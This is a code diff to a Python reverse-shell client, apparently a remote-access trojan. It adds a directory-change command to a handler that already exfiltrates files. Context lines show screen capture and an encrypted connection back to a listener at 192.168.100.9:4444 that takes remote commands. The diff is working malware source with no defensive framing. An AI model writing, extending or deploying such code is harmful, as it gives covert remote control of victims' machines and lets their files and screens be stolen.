@@ -29,7 +29,20 @@ def capture_screenshot():
     return img_byte_arr.getvalue()
 
 def handle_command(cmd, s, fernet):
-    if cmd.startswith("upload:"):
+    if cmd.startswith("cd "):
+        try:
+            new_dir = cmd.split(" ", 1)[1].strip()
+            if new_dir:
+                os.chdir(new_dir)
+                new_cwd = os.getcwd()
+                s.send(fernet.encrypt(f"Changed directory to {new_cwd}".encode()))
+            else:
+                s.send(fernet.encrypt(os.getcwd().encode()))
+        except FileNotFoundError:
+            s.send(fernet.encrypt(b"Directory not found"))
+        except Exception as e:
+            s.send(fernet.encrypt(f"Error changing directory: {str(e)}".encode()))
+    elif cmd.startswith("upload:"):
         file_path = cmd.split(":")[1]
         try:
             with open(file_path, "rb") as f:
@@ -74,10 +87,14 @@ def reverse_shell(host="192.168.100.9", port=4444, key=key):
             print("Connection established.")
 
             while True:
+                # Receive command from the listener first
                 cmd = fernet.decrypt(s.recv(4096)).decode()
                 if cmd.lower() == "exit":
                     break
+                
+                # Now, handle the command and send back the output
                 handle_command(cmd, s, fernet)
+
         except socket.error as e:
             print(f"Socket error: {e}")
             time.sleep(5)
